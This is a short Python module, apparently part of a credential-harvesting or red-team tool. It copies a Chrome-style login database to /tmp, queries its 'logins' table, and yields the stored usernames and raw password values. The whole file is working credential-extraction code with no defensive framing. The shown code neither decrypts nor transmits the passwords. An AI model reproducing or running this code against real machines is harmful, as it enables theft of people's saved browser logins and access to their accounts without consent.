import logging
import os
import shutil
import sqlite3
from collections.abc import Callable, Iterator
from pathlib import Path

logger = logging.getLogger(__name__)

DB_TEMP_PATH = "/tmp/chrome.db"
DB_SQL_STATEMENT = "SELECT username_value,password_value FROM logins"

ExtractedCredentialPair = tuple[str, bytes]
DatabaseReader = Callable[[Path], Iterator[ExtractedCredentialPair]]


def get_credentials_from_database(
    database_path: Path,
) -> Iterator[ExtractedCredentialPair]:
    if database_path.is_file():
        try:
            shutil.copyfile(database_path, DB_TEMP_PATH)

            conn = sqlite3.connect(DB_TEMP_PATH)
        except Exception:
            logger.exception("Error encounter while connecting to " f"database: {database_path}")
            os.remove(DB_TEMP_PATH)
            return

        try:
            yield from _process_login_data(conn)
        except Exception:
            logger.exception("Error encountered while processing " f"database {database_path}")
        finally:
            conn.close()
            os.remove(DB_TEMP_PATH)


def _process_login_data(connection: sqlite3.Connection) -> Iterator[ExtractedCredentialPair]:
    for user, password in connection.execute(DB_SQL_STATEMENT):
        yield user, password
